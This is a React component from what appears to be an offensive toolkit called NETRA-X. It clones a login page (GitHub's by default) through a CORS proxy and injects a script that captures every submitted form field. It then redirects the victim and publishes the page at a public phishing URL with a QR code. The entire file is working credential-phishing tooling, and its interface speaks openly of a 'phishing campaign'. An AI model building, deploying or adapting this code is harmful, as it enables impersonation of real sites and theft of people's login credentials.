
'use client';

import { useState, useRef } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, AlertTriangle, Globe, Download, RefreshCw, Bot, Copy, Wand, StopCircle, Code, Eye } from 'lucide-react';
import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
import { useToast } from '@/hooks/use-toast';
import { QrCodeGenerator } from './qr-code-generator';
import { Label } from './ui/label';

const pageClonerSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

const getHarvesterScript = (redirectUrl: string) => `
<script>
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    document.addEventListener('submit', function(e) {
        e.preventDefault();
        e.stopPropagation();
        captureAndRedirect(e.target);
    }, true);
</script>
`;

export function LoginPageCloner() {
  const { toast } = useToast();
  const [clonedHtml, setClonedHtml] = useState<string | null>(null);
  const [hostedUrlId, setHostedUrlId] = useState<string | null>(null);
  const [showPreview, setShowPreview] = useState(false);
  
  const [isCloning, setIsCloning] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  
  const [clonerError, setClonerError] = useState<string | null>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      targetUrl: 'https://github.com/login',
      redirectUrl: 'https://github.com/password_reset',
    },
  });
  
  const resetState = () => {
      setClonedHtml(null);
      setHostedUrlId(null);
      setClonerError(null);
      setShowPreview(false);
  }

  const onClonerSubmit = async (values: z.infer<typeof pageClonerSchema>) => {
    setIsCloning(true);
    resetState();
    toast({ title: "Cloning page...", description: "This may take a moment. Ensure the target site allows framing." });

    const iframe = iframeRef.current;
    if (!iframe) return;
    
    // Use a proxy to bypass CORS issues. In a real app, this would be a self-hosted proxy.
    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(values.targetUrl)}`;
    
    iframe.src = proxyUrl;
    
    const timeout = setTimeout(() => {
        setIsCloning(false);
        setClonerError("Cloning timed out. The target website may be blocking this request. Try another URL.");
        toast({ variant: 'destructive', title: 'Cloning Failed', description: 'The operation timed out.' });
    }, 15000); // 15-second timeout

    iframe.onload = async () => {
        clearTimeout(timeout);
        try {
            const html = iframe.contentWindow?.document.documentElement.outerHTML;
            if (html && !html.includes("request blocked")) {
                const harvesterScript = getHarvesterScript(values.redirectUrl);
                let finalHtml = html;
                 // Inject the credential harvester script before the closing body tag
                if (finalHtml.includes('</body>')) {
                  finalHtml = finalHtml.replace(/<\/body>/i, `${harvesterScript}</body>`);
                } else {
                  finalHtml = finalHtml + harvesterScript;
                }
                setClonedHtml(finalHtml);
                toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
            } else {
                 setClonerError("Failed to clone. The website might be using anti-framing headers (X-Frame-Options) or the CORS proxy may have been blocked.");
            }
        } catch (e) {
            console.error("Cloning error:", e);
            setClonerError("A security error occurred while trying to access the page content. The target website is likely protected against this type of cloning.");
        } finally {
            setIsCloning(false);
        }
    };
    
    iframe.onerror = () => {
        clearTimeout(timeout);
        setIsCloning(false);
        setClonerError("Failed to load the target URL in the cloning frame.");
    };
  };

  const handleHostPage = async () => {
    if (!clonedHtml) return;
    setIsHosting(true);
    setHostedUrlId(null);
    setClonerError(null);
    try {
      const response = await hostClonedPage({ htmlContent: clonedHtml });
      setHostedUrlId(response.pasteId);
      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
    } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
       setClonerError(errorMessage);
       console.error(err);
    } finally {
      setIsHosting(false);
    }
  };
  
  const handleStopHosting = () => {
    resetState();
    toast({
      title: "Hosting Deactivated",
      description: "The public URL has been removed from this interface.",
    });
  };

  const handleDownloadHtml = () => {
    if (clonedHtml) {
      const blob = new Blob([clonedHtml], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cloned_login.html';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
    }
  };

  const handleCopy = (textToCopy: string) => {
    navigator.clipboard.writeText(textToCopy);
    toast({ title: "Copied!", description: "URL copied to clipboard." });
  }

  const fullHostedUrl = hostedUrlId ? `${window.location.origin}/api/phishing/serve/${hostedUrlId}` : null;
  
  return (
    <>
      <iframe ref={iframeRef} sandbox="allow-scripts allow-same-origin" className="hidden" title="cloner"></iframe>
      <div className="grid lg:grid-cols-5 gap-6">
        <div className="lg:col-span-2 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Page Cloner & Host</CardTitle>
              <CardDescription>Create a static clone of a login page and host it on a public URL.</CardDescription>
            </CardHeader>
            <CardContent>
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
                  <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem> <FormLabel>1. Target URL to Clone</FormLabel> <FormControl><Input placeholder="https://example.com/login" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                  <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
                  <Button type="submit" disabled={isCloning} className="w-full">
                    {isCloning ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
                    Clone Page Content
                  </Button>
                </form>
              </Form>
            </CardContent>
            {clonedHtml && (
              <CardFooter className="flex-col gap-4">
                <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                    {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                    3. Host Page
                </Button>
                 <Button onClick={() => setShowPreview(!showPreview)} variant="secondary" className="w-full">
                    <Eye className="mr-2 h-4 w-4"/> {showPreview ? 'Hide' : 'Show'} Cloned Code
                </Button>
                <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
                    <Download className="mr-2 h-4 w-4"/> Download HTML
                </Button>
              </CardFooter>
            )}
          </Card>
          
          {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p className="text-sm">{clonerError}</p></CardContent></Card>}
          
          {fullHostedUrl && (
            <QrCodeGenerator url={fullHostedUrl} />
          )}

        </div>

        <div className="lg:col-span-3">
          <Card className="min-h-full">
            <CardHeader>
              <CardTitle>Hosted Page Information</CardTitle>
              <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
            </CardHeader>
            <CardContent className="w-full space-y-4">
              {(isCloning || isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
              
              {!clonedHtml && !isCloning && !showPreview && (
                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                      <Bot className="h-12 w-12 mb-4" />
                      <p>Clone a page to get started.</p>
                  </div>
              )}
              
              {clonedHtml && !fullHostedUrl && !isHosting && !showPreview && (
                  <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                      <Globe className="h-12 w-12 mb-4" />
                      <p>Page cloned successfully.</p>
                      <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
                  </div>
              )}
              
              {showPreview && (
                 <div className="space-y-2">
                    <Label>Cloned HTML Code</Label>
                    <pre className="h-96 border rounded-md p-2 bg-primary/10 text-xs overflow-auto font-mono">
                        <code>{clonedHtml}</code>
                    </pre>
                </div>
              )}

              {fullHostedUrl && !showPreview && (
                <div className="space-y-4 animate-in fade-in">
                  <div className="space-y-2">
                    <Label htmlFor="public-url">Public URL</Label>
                    <div className="flex items-center gap-2">
                          <Input id="public-url" readOnly value={fullHostedUrl} className="font-mono"/>
                          <Button variant="ghost" size="icon" onClick={() => handleCopy(fullHostedUrl)}><Copy className="h-4 w-4"/></Button>
                    </div>
                    <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
                  </div>

                  <div className="flex flex-wrap gap-2">
                       <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
                          <StopCircle className="mr-2 h-4 w-4" />
                          Stop Hosting
                      </Button>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </div>
    </>
  );
}
